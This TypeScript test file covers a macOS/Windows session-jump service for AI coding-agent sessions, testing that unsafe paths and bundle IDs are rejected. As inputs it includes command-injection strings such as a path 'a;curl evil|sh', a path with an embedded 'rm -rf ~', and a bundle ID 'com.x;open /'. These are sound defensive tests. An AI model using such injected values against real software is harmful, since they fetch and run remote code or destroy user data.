import assert from 'node:assert/strict'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import test from 'node:test'
import type { AgentStatusEvent } from '../src/types/agent.ts'
import {
  activateMacBundle,
  isShellSafePath,
  isUsableProjectPath,
  SessionJumpService,
  sessionJumpKey,
  takeSessionJumpContext,
  verifyProjectDirectory,
  withSessionJumpContext,
  type SessionJumpDependencies,
} from '../electron/session-jump.ts'

// Every side effect (open -b, Finder, clipboard) is injected: these tests never launch an app,
// open a window or touch the real clipboard, and all paths live in a throw-away temp directory.

const realFs = {
  realpath: (target: string) => fs.promises.realpath(target),
  stat: (target: string) => fs.promises.stat(target),
  exists: async (target: string) => fs.promises.lstat(target).then(() => true, () => false),
}

function tempRoot(t: { after(fn: () => void): void }): string {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'agent-pets-jump-'))
  t.after(() => fs.rmSync(root, { recursive: true, force: true }))
  return root
}

function harness(overrides: Partial<SessionJumpDependencies> = {}) {
  const calls: Array<[string, string]> = []
  let now = 1_000_000
  const preferences = { sessionJumpEnabled: true, sessionJumpSwitchAppEnabled: true }
  const service = new SessionJumpService({
    platform: 'darwin',
    now: () => now,
    getPreferences: () => preferences,
    activateBundle: async bundleId => { calls.push(['activate', bundleId]) },
    revealDirectory: directory => { calls.push(['reveal', directory]) },
    writeClipboard: text => { calls.push(['clipboard', text]) },
    ...realFs,
    ...overrides,
  })
  return { service, calls, preferences, advance: (ms: number) => { now += ms } }
}

function event(overrides: Partial<AgentStatusEvent> = {}): AgentStatusEvent {
  return {
    adapterId: 'claude-code',
    source: 'claude',
    sessionId: 'session-1',
    state: 'waiting-permission',
    timestamp: 1,
    host: { kind: 'terminal', app: 'iterm2' },
    ...overrides,
  }
}

const KEY = sessionJumpKey('claude', 'session-1')

test('switch to app activates only the allowlisted bundle of a built-in adapter session', async () => {
  const { service, calls } = harness()
  service.record(event(), { bundleId: 'com.googlecode.iterm2' })
  assert.deepEqual(await service.run('switch-app', KEY), { ok: true })
  assert.deepEqual(calls, [['activate', 'com.googlecode.iterm2']])
})

test('generic HTTP events can never choose an app to bring forward', async () => {
  const { service, calls } = harness()
  service.record(event({ adapterId: 'generic-http' }), { bundleId: 'com.googlecode.iterm2' })
  assert.equal(service.switchTarget(KEY), null)
  assert.deepEqual(await service.run('switch-app', KEY), { ok: false, error: 'unavailable' })
  service.record(event({ adapterId: undefined, sessionId: 'session-2' }))
  assert.deepEqual(await service.run('switch-app', sessionJumpKey('claude', 'session-2')), { ok: false, error: 'unavailable' })
  assert.deepEqual(calls, [])
})

test('switch to app is unsupported off macOS and follows both toggles', async () => {
  const windows = harness({ platform: 'win32' })
  windows.service.record(event())
  assert.deepEqual(await windows.service.run('switch-app', KEY), { ok: false, error: 'unsupported' })

  const { service, calls, preferences } = harness()
  service.record(event())
  preferences.sessionJumpSwitchAppEnabled = false
  assert.deepEqual(await service.run('switch-app', KEY), { ok: false, error: 'disabled' })
  preferences.sessionJumpSwitchAppEnabled = true
  preferences.sessionJumpEnabled = false
  assert.deepEqual(await service.run('copy-path', KEY), { ok: false, error: 'disabled' })
  assert.deepEqual(calls, [])
})

test('show folder only reveals an existing, non-bundle directory (resolved through links)', { skip: process.platform === 'win32' }, async t => {
  const root = tempRoot(t)
  const project = path.join(root, 'my-app')
  fs.mkdirSync(project)
  const file = path.join(root, 'run.command')
  fs.writeFileSync(file, '#!/bin/sh\n')
  const bundle = path.join(root, 'Evil.app')
  fs.mkdirSync(bundle)
  const oddBundle = path.join(root, 'odd')
  fs.mkdirSync(path.join(oddBundle, 'Contents'), { recursive: true })
  fs.writeFileSync(path.join(oddBundle, 'Contents', 'Info.plist'), '<plist/>')
  const linkToFile = path.join(root, 'link-to-file')
  fs.symlinkSync(file, linkToFile)
  const linkToProject = path.join(root, 'link-to-project')
  fs.symlinkSync(project, linkToProject)

  const { service, calls, advance } = harness()
  const cases: Array<[string, string, boolean]> = [
    ['dir', project, true],
    ['link-dir', linkToProject, true],
    ['file', file, false],
    ['link-file', linkToFile, false],
    ['app', bundle, false],
    ['bundle', oddBundle, false],
    ['missing', path.join(root, 'gone'), false],
  ]
  for (const [id, projectPath, opens] of cases) {
    advance(10_001) // stay under the per-action rate limit
    service.record(event({ sessionId: id }), { projectPath })
    const result = await service.run('show-folder', sessionJumpKey('claude', id))
    assert.deepEqual(result, opens ? { ok: true } : { ok: false, error: 'unavailable' }, id)
  }
  const realProject = fs.realpathSync(project)
  assert.deepEqual(calls, [['reveal', realProject], ['reveal', realProject]])
})

test('a document package folder is only revealed, never handed to its app', { skip: process.platform === 'win32' }, async t => {
  // LaunchServices would open x.xcodeproj in Xcode; the service has no "open" dependency at all.
  const root = tempRoot(t)
  const xcodeproj = path.join(root, 'x.xcodeproj')
  fs.mkdirSync(xcodeproj)
  const { service, calls } = harness()
  service.record(event(), { projectPath: xcodeproj })
  assert.deepEqual(await service.run('show-folder', KEY), { ok: true })
  assert.deepEqual(calls, [['reveal', fs.realpathSync(xcodeproj)]])
})

test('shell metacharacters make a path unsafe to paste', () => {
  for (const bad of ['/tmp/a;b', '/tmp/a|b', '/tmp/a&b', '/tmp/$HOME', '/tmp/`x`', '/tmp/a>b', '/tmp/(x)', '/tmp/{x}', '/tmp/*', '/tmp/a?', '/tmp/a!', '/tmp/"x"', "/tmp/'x'", '/tmp/a\\b', '/tmp/a\nb']) {
    assert.equal(isShellSafePath(bad, 'darwin'), false, bad)
  }
  assert.equal(isShellSafePath('/Users/me/work/my-app_v2.0 copy', 'darwin'), true)
  assert.equal(isShellSafePath('C:\\work\\repo', 'win32'), true)
  assert.equal(isShellSafePath('C:\\work\\%PATH%', 'win32'), false)
  assert.equal(isShellSafePath('C:\\work\\a^b', 'win32'), false)
})

test('a relative, control-character or UNC path is never used', async () => {
  assert.equal(isUsableProjectPath('relative/dir', 'darwin'), false)
  assert.equal(isUsableProjectPath('/tmp/x\nrm -rf ~', 'darwin'), false)
  assert.equal(isUsableProjectPath(`/${'a'.repeat(5000)}`, 'darwin'), false)
  assert.equal(isUsableProjectPath('\\\\server\\share\\repo', 'win32'), false)
  assert.equal(isUsableProjectPath('//server/share/repo', 'win32'), false)
  assert.equal(isUsableProjectPath('C:\\work\\repo', 'win32'), true)
  assert.equal(await verifyProjectDirectory('C:\\work\\x.{20D04FE0-3AEA-1069-A2D8-08002B30309D}', {
    platform: 'win32',
    realpath: async target => target,
    stat: async () => ({ isDirectory: () => true }),
    exists: async () => false,
  }), null)
  // A link that resolves to a UNC share is rejected after realpath.
  assert.equal(await verifyProjectDirectory('C:\\work\\link', {
    platform: 'win32',
    realpath: async () => '\\\\server\\share',
    stat: async () => ({ isDirectory: () => true }),
    exists: async () => false,
  }), null)

  const { service, calls } = harness()
  service.record(event(), { projectPath: '/tmp/x\nrm -rf ~' })
  assert.deepEqual(await service.run('copy-path', KEY), { ok: false, error: 'unavailable' })
  assert.deepEqual(calls, [])
})

test('copy path copies the reported path of an existing directory and keeps it across path-less events', { skip: process.platform === 'win32' }, async t => {
  const root = tempRoot(t)
  const project = path.join(root, 'my-app')
  fs.mkdirSync(project)
  const { service, calls } = harness()
  service.record(event(), { projectPath: project })
  service.record(event({ state: 'thinking' }), {})
  assert.deepEqual(await service.run('copy-path', KEY), { ok: true })
  assert.deepEqual(calls, [['clipboard', project]])

  // Shell metacharacters never reach the clipboard, even when such a directory really exists.
  const forged = path.join(root, 'a;curl evil|sh')
  fs.mkdirSync(forged)
  service.record(event({ sessionId: 'forged' }), { projectPath: forged })
  assert.deepEqual(await service.run('copy-path', sessionJumpKey('claude', 'forged')), { ok: false, error: 'unavailable' })
  assert.equal(calls.length, 1)
})

test('actions are rate limited per action and unknown, offline or stale sessions are refused', { skip: process.platform === 'win32' }, async () => {
  const { service, calls, advance } = harness()
  service.record(event(), { projectPath: os.tmpdir() })
  for (let index = 0; index < 5; index += 1) assert.deepEqual(await service.run('copy-path', KEY), { ok: true })
  assert.deepEqual(await service.run('copy-path', KEY), { ok: false, error: 'rate_limited' })
  // Another action has its own budget.
  assert.deepEqual(await service.run('switch-app', KEY), { ok: true })
  advance(10_001)
  assert.deepEqual(await service.run('copy-path', KEY), { ok: true })
  assert.equal(calls.length, 7)

  assert.deepEqual(await service.run('copy-path', 'claude:nope'), { ok: false, error: 'unknown_session' })
  advance(46 * 60_000)
  assert.deepEqual(await service.run('copy-path', KEY), { ok: false, error: 'unknown_session' })
  service.record(event(), { projectPath: os.tmpdir() })
  service.record(event({ state: 'offline' }))
  assert.deepEqual(await service.run('copy-path', KEY), { ok: false, error: 'unknown_session' })
})

test('launcher and directory failures are reported, not thrown', { skip: process.platform === 'win32' }, async () => {
  const { service } = harness({
    activateBundle: async () => { throw new Error('Unable to find application') },
    revealDirectory: () => { throw new Error('Failed to reveal') },
  })
  service.record(event(), { projectPath: os.tmpdir() })
  assert.deepEqual(await service.run('switch-app', KEY), { ok: false, error: 'failed' })
  assert.deepEqual(await service.run('show-folder', KEY), { ok: false, error: 'failed' })
})

test('activateMacBundle runs /usr/bin/open -b without a shell and rejects anything else', async () => {
  const runs: unknown[] = []
  await activateMacBundle('com.googlecode.iterm2', (file, args, options, callback) => {
    runs.push([file, args, options])
    callback(null)
  })
  assert.deepEqual(runs, [['/usr/bin/open', ['-b', 'com.googlecode.iterm2'], { timeout: 5000, shell: false }]])
  await assert.rejects(activateMacBundle('-a Calculator', () => assert.fail('must not run')))
  await assert.rejects(activateMacBundle('com.x;open /', () => assert.fail('must not run')))
})

test('ingress context keeps the path and bundle id off the dispatched event', () => {
  const input = {
    source: 'claude',
    sessionId: 'session-1',
    project: '/Users/someone/work/my-app',
    host: { termProgram: 'iTerm.app', bundleId: 'com.googlecode.iterm2' },
  }
  const dispatched = withSessionJumpContext(input, event({ project: 'my-app' }), 'darwin')
  assert.deepEqual(dispatched.host, { kind: 'terminal', app: 'iterm2', switchable: true })
  assert.doesNotMatch(JSON.stringify(dispatched), /someone|googlecode/)
  assert.deepEqual(takeSessionJumpContext(dispatched), { projectPath: '/Users/someone/work/my-app', bundleId: 'com.googlecode.iterm2' })
  assert.equal(takeSessionJumpContext(dispatched), undefined)

  assert.equal(withSessionJumpContext(input, event({ adapterId: 'generic-http' }), 'darwin').host?.switchable, false)
  assert.equal(withSessionJumpContext(input, event(), 'win32').host?.switchable, false)
  assert.equal(withSessionJumpContext(input, event({ host: { kind: 'ide', app: 'jetbrains' } }), 'darwin').host?.switchable, false)
})

test('a notification click switches only when the session app can be activated and switching is on', async () => {
  const { service, calls, preferences } = harness()
  service.record(event(), { bundleId: 'com.googlecode.iterm2' })
  service.record(event({ sessionId: 'generic', adapterId: 'generic-http' }))
  assert.equal(await service.switchFromNotification({ source: 'claude', sessionId: 'generic' }), false)
  assert.equal(await service.switchFromNotification({ source: 'claude', sessionId: 'missing' }), false)
  preferences.sessionJumpSwitchAppEnabled = false
  assert.equal(await service.switchFromNotification({ source: 'claude', sessionId: 'session-1' }), false)
  preferences.sessionJumpSwitchAppEnabled = true
  assert.equal(await service.switchFromNotification({ source: 'claude', sessionId: 'session-1' }), true)
  assert.deepEqual(calls, [['activate', 'com.googlecode.iterm2']])
})
